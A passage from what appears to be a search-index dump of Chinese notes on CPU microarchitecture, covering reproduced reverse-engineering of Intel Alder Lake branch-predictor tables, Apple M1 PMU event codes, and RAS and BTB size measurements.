<p>\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\uff0c\u200b\u8bba\u6587\u200b\u8bbe\u8ba1\u200b\u4e86\u200b Listing 6 \u200b\u7684\u200b\u5b9e\u9a8c\u200b\uff1a\u200b\u6784\u9020\u200b\u4e24\u4e2a\u200b\u65b9\u5411\u200b\u76f8\u53cd\u200b\u7684\u200b\u5206\u652f\u200b\uff0c\u200b\u91c7\u7528\u200b\u76f8\u540c\u200b\u7684\u200b PHR\uff0c\u200b\u7136\u540e\u200b\u8fd9\u200b\u4e24\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b\u4f4e\u200b\u82e5\u5e72\u4f4d\u200b\u90fd\u200b\u662f\u200b 0\uff0c\u200b\u7136\u540e\u200b\u89c2\u5bdf\u200b PC \u200b\u591a\u5c11\u200b\u4f4d\u662f\u200b 0 \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u63d0\u9ad8\u200b\u3002</p> <p>\u200b\u5728\u200b Skylake \u200b\u4e0a\u200b\u8fdb\u884c\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u590d\u73b0\u200b\u4e86\u200b\u8bba\u6587\u200b\u4e2d\u200b\u7684\u200b\u7ed3\u679c\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b Index \u200b\u6216\u200b Tag \u200b\u51fd\u6570\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b PC \u200b\u7684\u200b\u4f4e\u200b 12 \u200b\u4f4d\u200b\u3002</p> <p>\u200b\u5728\u200b Alder Lake \u200b\u4e0a\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u5f97\u5230\u200b\u7684\u200b\u7ed3\u679c\u200b\u5982\u56fe\u200b\uff1a</p> <p></p> <p>\u200b\u8bf4\u660e\u200b Index \u200b\u6216\u200b Tag \u200b\u51fd\u6570\u200b\u53ea\u7528\u200b\u5230\u200b\u4e86\u200b PC \u200b\u7684\u200b\u4f4e\u200b 16 \u200b\u4f4d\u200b\u3002\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u4e5f\u200b\u548c\u200b Indirector \u200b\u91cc\u200b\u5f97\u5230\u200b\u7684\u200b Intel IBP \u200b\u7684\u200b PHT Tag \u200b\u51fd\u6570\u200b\u8ba1\u7b97\u200b\u65b9\u5f0f\u200b\u4e00\u81f4\u200b\uff0c\u200b\u8bf4\u660e\u200b CBP \u200b\u548c\u200b IBP \u200b\u53ef\u80fd\u200b\u91c7\u7528\u200b\u4e86\u200b\u7c7b\u4f3c\u200b\u7684\u200b Tag \u200b\u51fd\u6570\u200b\u8bbe\u8ba1\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#pht-set","title":"PHT \u200b\u4e2d\u200b\u6bcf\u4e2a\u200b Set \u200b\u7684\u200b\u8def\u6570","text":"<p>\u200b\u8fdb\u4e00\u6b65\u200b\uff0c\u200b\u4e3a\u4e86\u200b\u6d4b\u8bd5\u200b PHT \u200b\u4e2d\u200b\u6bcf\u4e2a\u200b Set \u200b\u7684\u200b\u8def\u6570\u200b\uff0c\u200b\u9700\u8981\u200b\u6784\u9020\u200b\u82e5\u5e72\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u4eec\u200b\u7684\u200b Index \u200b\u76f8\u540c\u200b\uff0c\u200b\u4f46\u662f\u200b Tag \u200b\u4e0d\u540c\u200b\uff0c\u200b\u90a3\u4e48\u200b\u8fd9\u4e9b\u200b\u5206\u652f\u200b\u90fd\u200b\u4f1a\u200b\u5bf9\u5e94\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Set \u200b\u91cc\u200b\uff0c\u200b\u7136\u540e\u200b\u4e00\u4e2a\u200b Set \u200b\u91cc\u200b\u8bb0\u5f55\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u5c31\u662f\u200b\u6bcf\u4e2a\u200b Set \u200b\u7684\u200b\u8def\u6570\u200b\u3002\u200b\u8bba\u6587\u200b\u6784\u9020\u200b\u4e86\u200b Listing 7 \u200b\u5b9e\u9a8c\u200b\uff0c\u200b\u901a\u8fc7\u200b\u64cd\u63a7\u200b PC \u200b\u5730\u5740\u200b\u4f4e\u4f4d\u200b\u548c\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u89c2\u5bdf\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u9884\u6d4b\u200b\u7684\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u8fdb\u800c\u200b\u5bf9\u200b PHT \u200b\u7684\u200b\u7ed3\u6784\u200b\u8fdb\u884c\u200b\u63a8\u65ad\u200b\u3002\u200b\u5728\u200b Alder Lake \u200b\u4e0a\u200b\u590d\u73b0\u200b\u4e86\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u7b2c\u4e00\u4e2a\u200b\u62d0\u70b9\u200b\u662f\u200b 4 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u8bf4\u660e\u200b\u662f\u200b 4 \u200b\u8def\u7ec4\u200b\u76f8\u8fde\u200b\u3002\u200b\u7136\u540e\u200b\u5728\u200b 32 \u200b\u5230\u200b 36 \u200b\u7684\u200b\u5730\u65b9\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u5c0f\u200b\u7684\u200b\u4e0d\u200b\u90a3\u4e48\u200b\u5e73\u200b\u7684\u200b\u5e73\u53f0\u200b\uff0c\u200b\u8fd9\u200b\u662f\u56e0\u4e3a\u200b PC[5] \u200b\u53c2\u4e0e\u200b\u5230\u200b\u4e86\u200b Index \u200b\u8ba1\u7b97\u200b\u5f53\u4e2d\u200b\uff0c\u200b\u6b64\u65f6\u200b\u5206\u652f\u200b\u4f1a\u200b\u5206\u5e03\u200b\u5728\u200b\u4e24\u4e2a\u200b Set \u200b\u91cc\u200b\uff0c\u200b\u6bcf\u4e2a\u200b Set \u200b\u53ef\u4ee5\u200b\u4fdd\u5b58\u200b 4 \u200b\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u52a0\u200b\u8d77\u6765\u200b\u603b\u5171\u200b\u53ef\u4ee5\u200b\u6b63\u786e\u200b\u9884\u6d4b\u200b 8 \u200b\u4e2a\u200b\u5206\u652f\u200b\u3002</p> <p>\u200b\u4fee\u6539\u200b Listing 7 \u200b\u91cc\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u5f53\u200b\u5b83\u200b\u51fa\u73b0\u200b\u5728\u200b PHR[133] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u200b\u8fd8\u662f\u200b 4\uff0c\u200b\u800c\u200b\u51fa\u73b0\u200b\u5728\u200b PHR[131] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 8\uff0c\u200b\u8bf4\u660e\u200b\u7b2c\u4e8c\u200b\u5927\u200b\u7684\u200b PHT \u200b\u53ea\u7528\u200b\u4e86\u200b PHR \u200b\u7684\u200b\u4f4e\u200b 132 \u200b\u4f4d\u200b\u3002\u200b\u7ee7\u7eed\u200b\u5411\u200b\u4e0b\u8c03\u200b\uff0ck \u200b\u51fa\u73b0\u200b\u5728\u200b PHR[69] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u200b\u8fd8\u662f\u200b 8\uff0c\u200b\u800c\u200b\u51fa\u73b0\u200b\u5728\u200b PHR[67] \u200b\u65f6\u200b\uff0c\u200b\u76f8\u8fde\u200b\u5ea6\u63d0\u9ad8\u200b\u5230\u200b\u4e86\u200b 12\u3002\u200b\u8bf4\u660e\u200b\u7b2c\u4e09\u200b\u5927\u200b\u7684\u200b PHT \u200b\u53ea\u7528\u200b\u4e86\u200b PHR \u200b\u7684\u200b\u4f4e\u200b 68 \u200b\u4f4d\u200b\u3002\u200b\u7ee7\u7eed\u200b\u628a\u200b k \u200b\u5411\u4e0b\u200b\u79fb\u52a8\u200b\uff0c\u200b\u5219\u200b\u770b\u4e0d\u5230\u200b\u66f4\u5927\u200b\u7684\u200b\u76f8\u8fde\u200b\u5ea6\u200b\uff0c\u200b\u8bf4\u660e\u200b Intel Alder Lake \u200b\u7684\u200b PHT \u200b\u53ea\u6709\u200b\u4e09\u4e2a\u200b\uff1a</p> <ol> <li>\u200b\u6700\u5c0f\u200b\u7684\u200b PHT \u200b\u4f7f\u7528\u200b\u4e86\u200b 68 \u200b\u4f4d\u200b\u7684\u200b PHR \u200b\u5386\u53f2\u200b</li> <li>\u200b\u4e2d\u7b49\u200b\u5927\u5c0f\u200b\u7684\u200b PHT \u200b\u4f7f\u7528\u200b\u4e86\u200b 132 \u200b\u4f4d\u200b\u7684\u200b PHR \u200b\u5386\u53f2\u200b</li> <li>\u200b\u6700\u5927\u200b\u7684\u200b PHT \u200b\u4f7f\u7528\u200b\u4e86\u200b\u5b8c\u6574\u200b 388 \u200b\u4f4d\u200b\u7684\u200b PHR \u200b\u5386\u53f2\u200b</li> </ol> <p>\u200b\u5e76\u4e14\u200b\u5b83\u4eec\u200b\u90fd\u200b\u662f\u200b\u56db\u8def\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#pht-index-phr-hash","title":"PHT Index \u200b\u4e2d\u200b PHR \u200b\u7684\u200b Hash \u200b\u7b97\u6cd5","text":"<p>\u200b\u8bba\u6587\u200b\u6784\u9020\u200b\u4e86\u200b\u4e00\u4e2a\u200b\u6d4b\u8bd5\u200b\uff0c\u200b\u76ee\u7684\u200b\u662f\u200b\u5224\u65ad\u200b PHT Index \u200b\u4e2d\u200b\u54ea\u4e9b\u200b PHR \u200b\u5f02\u6216\u200b\u5230\u200b\u4e86\u200b\u540c\u4e00\u4e2a\u200b\u4f4d\u4e0a\u200b\uff0c\u200b\u65b9\u6cd5\u200b\u662f\u200b\uff0c\u200b\u7531\u4e8e\u200b\u5df2\u77e5\u200b PHT \u200b\u662f\u200b\u56db\u8def\u200b\u7ec4\u200b\u76f8\u8fde\u200b\uff0c\u200b\u4e5f\u200b\u77e5\u9053\u200b PHT Index \u200b\u53ea\u7528\u200b\u4e86\u200b PC[5]\uff0c\u200b\u5176\u4ed6\u200b\u7684\u200b PC \u200b\u6ca1\u6709\u200b\u7528\u5230\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6784\u9020\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u4eec\u200b\u90fd\u200b\u7528\u200b PHR=k000...0 \u200b\u4f5c\u4e3a\u200b\u9884\u6d4b\u200b\u7684\u200b\u8f93\u5165\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5b83\u4eec\u200b\u4f1a\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Set \u200b\u4e0a\u200b\uff1b\u200b\u518d\u200b\u6784\u9020\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\uff0c\u200b\u5b83\u4eec\u200b\u90fd\u200b\u7528\u200b PHR=000....0k0...0 \u200b\u4f5c\u4e3a\u200b\u9884\u6d4b\u200b\u7684\u200b\u8f93\u5165\u200b\uff0c\u200b\u6b64\u65f6\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\u4f1a\u200b\u53d8\u5316\u200b\uff0c\u200b\u8fd9\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\u4e5f\u200b\u4f1a\u200b\u88ab\u200b\u6620\u5c04\u200b\u5230\u200b\u540c\u4e00\u4e2a\u200b Set \u200b\u4e0a\u200b\u3002\u200b\u5982\u679c\u200b\u524d\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\u548c\u200b\u540e\u200b\u56db\u4e2a\u200b\u5206\u652f\u200b\u7684\u200b PHR \u200b\u8ba1\u7b97\u200b\u51fa\u200b\u540c\u4e00\u4e2a\u200b Index\uff0c\u200b\u90a3\u200b\u5c31\u200b\u51fa\u73b0\u200b\u4e86\u200b\u51b2\u7a81\u200b\uff0c\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\u9519\u8bef\u7387\u200b\u63d0\u9ad8\u200b\u3002</p> <p>\u200b\u6309\u7167\u200b\u8fd9\u4e2a\u200b\u601d\u8def\u200b\uff0c\u200b\u5728\u200b Alder Lake \u200b\u4e0a\u200b\u8fdb\u884c\u200b\u4e86\u200b\u6d4b\u8bd5\u200b\uff1a</p> <p></p> <p>\u200b\u8fd9\u91cc\u200b\u6d4b\u8bd5\u200b\u7684\u200b\u548c\u200b\u8bba\u6587\u200b\u4e2d\u200b\u7a0d\u200b\u6709\u200b\u4e0d\u540c\u200b\uff1a\u200b\u8fd9\u91cc\u200b\u6a2a\u5750\u6807\u200b\u662f\u200b\u8bbe\u7f6e\u200b PHR \u200b\u4e3a\u200b k0 \u200b\u4e4b\u540e\u200b\u518d\u200b\u79fb\u4f4d\u200b PHR \u200b\u7684\u200b\u5206\u652f\u200b\u7684\u200b\u4e2a\u6570\u200b\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff0c\u200b\u4e8e\u662f\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\u8ba1\u7b97\u200b\u51fa\u200b k \u200b\u7684\u200b\u4f4d\u7f6e\u200b\uff1ak \u200b\u7684\u200b\u4e0b\u6807\u200b\u662f\u200b\u6a2a\u5ea7\u6807\u200b\u4e58\u4ee5\u200b\u4e8c\u52a0\u200b\u4e00\u200b\u3002\u200b\u4ece\u200b\u56fe\u91cc\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5cf0\u503c\u200b\u7684\u200b\u6a2a\u5ea7\u6807\u200b\u5448\u200b\u4e00\u4e2a\u200b\u7b49\u5dee\u6570\u5217\u200b\uff1a67, 76, ... 193\uff0c\u200b\u6570\u5217\u200b\u7684\u200b\u516c\u5dee\u200b\u4e3a\u200b 9\uff0c\u200b\u5bf9\u5e94\u200b 18 \u200b\u4e2a\u200b bit\uff0c\u200b\u8bf4\u660e\u200b PHR[387] \u200b\u548c\u200b PHR[369] \u200b\u548c\u200b PHR[351] \u200b\u7b49\u7b49\u200b\u7b49\u200b\u662f\u200b\u5f02\u6216\u200b\u5728\u200b\u4e00\u8d77\u200b\u7684\u200b\u5173\u7cfb\u200b\uff0c\u200b\u6700\u540e\u200b\u6210\u4e3a\u200b\u4e86\u200b Index \u200b\u7684\u200b\u67d0\u200b\u4e00\u4f4d\u200b\u3002</p> <p>\u200b\u8fd9\u4e2a\u200b\u7ed3\u679c\u200b\u548c\u200b Indirector \u200b\u7684\u200b IBP \u200b\u7684\u200b Index Hash \u200b\u662f\u200b\u4e00\u81f4\u200b\u7684\u200b\uff0c\u200b\u867d\u7136\u200b\u4e00\u4e2a\u200b\u662f\u200b CBP\uff0c\u200b\u4e00\u4e2a\u200b\u662f\u200b IBP\u3002\u200b\u6682\u65f6\u200b\u8fd8\u200b\u6ca1\u6709\u200b\u5f80\u200b\u66f4\u200b\u5c0f\u200b\u7684\u200b\u5386\u53f2\u200b\u957f\u5ea6\u200b\u6d4b\u200b\uff0c\u200b\u662f\u56e0\u4e3a\u200b\u4f1a\u200b\u6d89\u53ca\u200b\u5230\u200b\u66f4\u200b\u591a\u200b\u7684\u200b PHT \u200b\u8868\u200b\uff0c\u200b\u6b64\u65f6\u200b\u9700\u8981\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u4e2a\u6570\u200b\uff0c\u200b\u4fdd\u8bc1\u200b\u586b\u6ee1\u200b\u5c0f\u200b\u7684\u200b\u548c\u200b\u5927\u200b\u7684\u200b PHT\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#_3","title":"\u53c2\u8003\u6587\u732e","text":"<ul> <li>Half&amp;Half: Demystifying Intel's Directional Branch Predictors for Fast, Secure Partitioned Execution</li> <li>Pathfinder: High-Resolution Control-Flow Attacks Exploiting the Conditional Branch Predictor </li> <li>Indirector: High-Precision Branch Target Injection Attacks Exploiting the Indirect Branch Predictor</li> <li>\u200b\u73b0\u4ee3\u200b\u5206\u652f\u200b\u9884\u6d4b\u200b\uff1a\u200b\u4ece\u200b\u5b66\u672f\u754c\u200b\u5230\u200b\u5de5\u4e1a\u754c\u200b</li> </ul>"},{"location":"hardware/cpu_microarchitecture.html#apple-m1","title":"Apple M1","text":"<p>Apple M1 \u200b\u662f\u200b\u5927\u5c0f\u200b\u6838\u200b\u67b6\u6784\u200b\uff0c\u200b\u5927\u6838\u200b Firestorm \u200b\u67b6\u6784\u200b\uff0c\u200b\u5c0f\u6838\u200b Icestorm \u200b\u67b6\u6784\u200b\u3002</p> <p>\u200b\u6ce8\u200b\uff1aApple M1 \u200b\u548c\u200b Apple A14 Bionic \u200b\u7528\u200b\u7684\u200b\u90fd\u200b\u662f\u200b Firestorm+Icestorm \u200b\u67b6\u6784\u200b\uff0cApple M2 \u200b\u548c\u200b Apple A15 Bionic \u200b\u7528\u200b\u7684\u200b\u90fd\u200b\u662f\u200b Avalanche+Blizzard \u200b\u67b6\u6784\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#linux-pmu","title":"Linux PMU","text":"<p>\u200b\u5728\u200b Linux \u200b\u4e0b\u7528\u200b perf_event_open \u200b\u8bbf\u95ee\u200b Apple M1 \u200b\u7684\u200b PMU \u200b\u9700\u8981\u200b\u4f20\u200b\u7279\u6b8a\u200b\u7684\u200b\u53c2\u6570\u200b\uff1a</p> <ol> <li>perf_event_attr \u200b\u7684\u200b type \u200b\u5fc5\u987b\u200b\u662f\u200b 0xA(Icestorm) \u200b\u6216\u8005\u200b 0xB(Firestorm)\uff0c\u200b\u6839\u636e\u200b\u8981\u200b Profile \u200b\u7684\u200b\u6838\u200b\u51b3\u5b9a\u200b\u4f20\u200b\u54ea\u4e2a\u200b</li> <li>perf_event_attr \u200b\u7684\u200b config \u200b\u7684\u200b\u53d6\u503c\u200b\u89c1\u200b dougallj/applecpu \u200b\u7684\u200b COUNTER_NAMES\uff0c\u200b\u4f8b\u5982\u200b\u6d4b\u91cf\u200b\u5468\u671f\u200b\u6570\u200b\u5c31\u662f\u200b 0x02\uff0c\u200b\u6d4b\u91cf\u200b\u5206\u652f\u200b\u9519\u8bef\u200b\u9884\u6d4b\u200b\u6b21\u6570\u200b\u5c31\u662f\u200b 0xcb</li> <li>perf_event_attr \u200b\u7684\u200b exclude_guest \u200b\u5fc5\u987b\u200b\u8bbe\u200b\u4e3a\u200b 1\uff0c\u200b\u5426\u5219\u200b\u4f1a\u200b\u5f97\u5230\u200b EOPNOTSUPP</li> </ol> <p>counter \u200b\u8ba1\u6570\u5668\u200b\u7684\u200b\u503c\u200b\uff0c\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u5728\u200b macOS \u200b\u4e0a\u200b\u4ece\u200b <code>plutil -p /usr/share/kpep/a14.plist</code> \u200b\u547d\u4ee4\u200b\u8f93\u51fa\u200b\u91cc\u200b\u770b\u5230\u200b\uff1a</p> <ul> <li>RETIRE_UOP (1, 0x1): All retired uops</li> <li>CORE_ACTIVE_CYCLE (2, 0x2): Cycles while the core was active</li> <li>L1I_TLB_FILL (4, 0x4): Translations filled into the L1 Instruction TLB</li> <li>L1D_TLB_FILL (5, 0x5): Translations filled into the L1 Data TLB</li> <li>MMU_TABLE_WALK_INSTRUCTION (7, 0x7): Table walk memory requests on behalf of instruction fetches</li> <li>MMU_TABLE_WALK_DATA (8, 0x8): Table walk memory requests on behalf of data accesses</li> <li>L2_TLB_MISS_INSTRUCTION (10, 0xa): Instruction fetches that missed in the L2 TLB</li> <li>L2_TLB_MISS_DATA (11, 0xb): Loads and stores that missed in the L2 TLB</li> <li>MMU_VIRTUAL_MEMORY_FAULT_NONSPEC (13, 0xd): Memory accesses that reached retirement that triggered any of the MMU virtual memory faults</li> <li>SCHEDULE_UOP (82, 0x52): Uops issued by the scheduler to any execution unit</li> <li>INTERRUPT_PENDING (108, 0x6c): Cycles while an interrupt was pending because it was masked</li> <li>MAP_STALL_DISPATCH (112, 0x70): Cycles while the Map Unit was stalled because of Dispatch back pressure</li> <li>MAP_REWIND (117, 0x75): Cycles while the Map Unit was blocked while rewinding due to flush and restart</li> <li>MAP_STALL (118, 0x76): Cycles while the Map Unit was stalled for any reason</li> <li>MAP_INT_UOP (124, 0x7c): Mapped Integer Unit uops</li> <li>MAP_LDST_UOP (125, 0x7d): Mapped Load and Store Unit uops, including GPR to vector register converts</li> <li>MAP_SIMD_UOP (126, 0x7e): Mapped Advanced SIMD and FP Unit uops</li> <li>FLUSH_RESTART_OTHER_NONSPEC (132, 0x84): Pipeline flush and restarts that were not due to branch mispredictions or memory order violations</li> <li>INST_ALL (140, 0x8c): All retired instructions</li> <li>INST_BRANCH (141, 0x8d): Retired branch instructions including calls and returns</li> <li>INST_BRANCH_CALL (142, 0x8e): Retired subroutine call instructions</li> <li>INST_BRANCH_RET (143, 0x8f): Retired subroutine return instructions</li> <li>INST_BRANCH_TAKEN (144, 0x90): Retired taken branch instructions</li> <li>INST_BRANCH_INDIR (147, 0x93): Retired indirect branch instructions including indirect calls</li> <li>INST_BRANCH_COND (148, 0x94): Retired conditional branch instructions (counts only B.cond)</li> <li>INST_INT_LD (149, 0x95): Retired load Integer Unit instructions</li> <li>INST_INT_ST (150, 0x96): Retired store Integer Unit instructions</li> <li>INST_INT_ALU (151, 0x97): Retired non-branch and non-load/store Integer Unit instructions</li> <li>INST_SIMD_LD (152, 0x98): Retired load Advanced SIMD and FP Unit instructions</li> <li>INST_SIMD_ST (153, 0x99): Retired store Advanced SIMD and FP Unit instructions</li> <li>INST_SIMD_ALU (154, 0x9a): Retired non-load/store Advanced SIMD and FP Unit instructions</li> <li>INST_LDST (155, 0x9b): Retired load and store instructions</li> <li>INST_BARRIER (156, 0x9c): Retired data barrier instructions</li> <li>L1D_TLB_ACCESS (160, 0xa0): Load and store accesses to the L1 Data TLB</li> <li>L1D_TLB_MISS (161, 0xa1): Load and store accesses that missed the L1 Data TLB</li> <li>L1D_CACHE_MISS_ST (162, 0xa2): Stores that missed the L1 Data Cache</li> <li>L1D_CACHE_MISS_LD (163, 0xa3): Loads that missed the L1 Data Cache</li> <li>LD_UNIT_UOP (166, 0xa6): Uops that flowed through the Load Unit</li> <li>ST_UNIT_UOP (167, 0xa7): Uops that flowed through the Store Unit</li> <li>L1D_CACHE_WRITEBACK (168, 0xa8): Dirty cache lines written back from the L1D Cache toward the Shared L2 Cache</li> <li>LDST_X64_UOP (177, 0xb1): Load and store uops that crossed a 64B boundary</li> <li>LDST_XPG_UOP (178, 0xb2): Load and store uops that crossed a 16KiB page boundary</li> <li>ATOMIC_OR_EXCLUSIVE_SUCC (179, 0xb3): Atomic or exclusive instruction successfully completed</li> <li>ATOMIC_OR_EXCLUSIVE_FAIL (180, 0xb4): Atomic or exclusive instruction failed (due to contention)</li> <li>L1D_CACHE_MISS_LD_NONSPEC (191, 0xbf): Retired loads that missed in the L1 Data Cache</li> <li>L1D_CACHE_MISS_ST_NONSPEC (192, 0xc0): Retired stores that missed in the L1 Data Cache</li> <li>L1D_TLB_MISS_NONSPEC (193, 0xc1): Retired loads and stores that missed in the L1 Data TLB</li> <li>ST_MEMORY_ORDER_VIOLATION_NONSPEC (196, 0xc4): Retired stores that triggered memory order violations</li> <li>BRANCH_COND_MISPRED_NONSPEC (197, 0xc5): Retired conditional branch instructions that mispredicted</li> <li>BRANCH_INDIR_MISPRED_NONSPEC (198, 0xc6): Retired indirect branch instructions including calls and returns that mispredicted</li> <li>BRANCH_RET_INDIR_MISPRED_NONSPEC (200, 0xc8): Retired return instructions that mispredicted</li> <li>BRANCH_CALL_INDIR_MISPRED_NONSPEC (202, 0xca): Retired indirect call instructions mispredicted</li> <li>BRANCH_MISPRED_NONSPEC (203, 0xcb): Retired branch instructions including calls and returns that mispredicted</li> <li>L1I_TLB_MISS_DEMAND (212, 0xd4): Demand instruction fetches that missed in the L1 Instruction TLB</li> <li>MAP_DISPATCH_BUBBLE (214, 0xd6): Bubble detected in dispatch stage</li> <li>L1I_CACHE_MISS_DEMAND (219, 0xdb): Demand fetch misses that require a new cache line fill of the L1 Instruction Cache</li> <li>FETCH_RESTART (222, 0xde): Fetch Unit internal restarts for any reason. Does not include branch mispredicts</li> <li>ST_NT_UOP (229, 0xe5): Store uops that executed with non-temporal hint</li> <li>LD_NT_UOP (230, 0xe6): Load uops that executed with non-temporal hint</li> </ul> <p>\u200b\u4ee5\u4e0a\u200b\u7ed3\u679c\u200b\u662f\u200b\u7528\u200b python3 cpu_microarchitecture_apple_pmc_dump.py /usr/share/kpep/a14.plist \u200b\u547d\u4ee4\u200b\u8dd1\u200b\u51fa\u6765\u200b\u7684\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#ras","title":"RAS \u200b\u5927\u5c0f","text":"<p>RAS \u200b\u5927\u5c0f\u200b\u7684\u200b\u6d4b\u8bd5\u65b9\u6cd5\u200b\u662f\u200b\u6784\u9020\u200b\u4e0d\u540c\u200b\u6df1\u5ea6\u200b\u7684\u200b\u9012\u5f52\u51fd\u6570\u200b\u8c03\u7528\u200b\uff0c\u200b\u901a\u8fc7\u89c2\u5bdf\u200b\u6027\u80fd\u200b\u6765\u200b\u5224\u65ad\u200b RAS \u200b\u662f\u5426\u200b\u4fdd\u5b58\u200b\u4e86\u200b\u6240\u6709\u200b\u8fd4\u56de\u200b\u5730\u5740\u200b\u3002</p> <p>Apple M1 Firestorm:</p> <p></p> <p>\u200b\u62d0\u70b9\u200b\u4e3a\u200b 50 \u200b\u7684\u200b\u8c03\u7528\u200b\u6df1\u5ea6\u200b\uff0c\u200b\u8bf4\u660e\u200b Apple M1 Firestorm \u200b\u7684\u200b RAS \u200b\u6709\u200b 50 \u200b\u9879\u200b\u3002</p> <p>Apple M1 Icestorm:</p> <p></p> <p>\u200b\u62d0\u70b9\u200b\u4e3a\u200b 32 \u200b\u7684\u200b\u8c03\u7528\u200b\u6df1\u5ea6\u200b\uff0c\u200b\u8bf4\u660e\u200b Apple M1 Icestorm \u200b\u7684\u200b RAS \u200b\u6709\u200b 32 \u200b\u9879\u200b\u3002</p>"},{"location":"hardware/cpu_microarchitecture.html#btb","title":"BTB \u200b\u5927\u5c0f","text":"<p>BTB \u200b\u5927\u5c0f\u200b\u7684\u200b\u6d4b\u8bd5\u65b9\u6cd5\u200b\u662f\u200b\u6784\u9020\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b\u5206\u652f\u200b\uff08\u200b\u65e0\u6761\u4ef6\u200b\u8df3\u8f6c\u200b\uff09\u200b\u6307\u4ee4\u200b\uff0c\u200b\u5982\u679c\u200b BTB \u200b\u4e0d\u591f\u200b\u5927\u200b\uff0c\u200b\u65e0\u6cd5\u200b\u4fdd\u5b58\u200b\u4e0b\u200b\u6240\u6709\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u76ee\u7684\u200b\u5730\u5740\u200b\uff0c\u200b\u6027\u80fd\u200b\u5c31\u200b\u4f1a\u200b\u51fa\u73b0\u200b\u4e0b\u964d\u200b\u3002\u200b\u7531\u4e8e\u200b\u5f88\u591a\u200b BTB \u200b\u91c7\u7528\u200b\u7ec4\u200b\u76f8\u8fde\u200b\u7684\u200b\u65b9\u5f0f\u200b\u7ec4\u7ec7\u200b\uff0c\u200b\u56e0\u6b64\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u4e5f\u200b\u4f1a\u200b\u5f71\u54cd\u200b BTB \u200b\u7684\u200b\u5b9e\u9645\u200b\u5bb9\u91cf\u200b\uff1a\u200b\u5982\u679c\u200b\u8fd9\u4e9b\u200b\u8df3\u8f6c\u200b\u6307\u4ee4\u200b\u7684\u200b\u5730\u5740\u200b\u90fd\u200b\u6620\u5c04\u200b\u5230\u200b\u4e86\u200b BTB \u200b\u7684\u200b\u4e00\u90e8\u5206\u200b Set \u200b\u4e0a\u200b\uff0c\u200b\u90a3\u4e48\u200b\u5176\u4f59\u200b\u7684\u200b Set \u200b\u5c06\u200b\u65e0\u6cd5\u200b\u5229\u7528\u200b\u3002\u200b\u56e0\u6b64\u200b\u6d4b\u8bd5\u200b BTB \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u4ec5\u200b\u8981\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u7684\u200b\u6570\u91cf\u200b\uff0c\u200b\u8fd8\u8981\u200b\u4fee\u6539\u200b\u5206\u652f\u200b\u7684\u200b\u5730\u5740\u200b\u95f4\u9694\u200b\uff08stride\uff09\u3002</p> <p>Apple M1 Firestorm:</p> <p>\u200b\u9996\u5148\u200b\u770b\u200b 